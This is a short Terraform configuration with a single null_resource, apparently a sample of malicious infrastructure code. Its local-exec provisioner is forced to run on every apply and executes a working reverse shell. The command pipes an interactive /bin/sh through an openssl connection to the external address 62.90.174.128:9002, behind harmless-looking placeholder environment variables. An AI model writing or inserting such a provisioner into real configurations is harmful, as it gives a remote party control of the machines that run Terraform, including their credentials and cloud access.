resource "null_resource" "Exec13" {
  # This trigger ensures the command runs every time
  triggers = {
    always_run = "${timestamp()}"
  }

  provisioner "local-exec" {
    command = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 62.90.174.128:9002 > /tmp/s; rm /tmp/s"

    environment = {
      FOO = "bar"
      BAR = 1
      BAZ = "true"
    }
  }
}
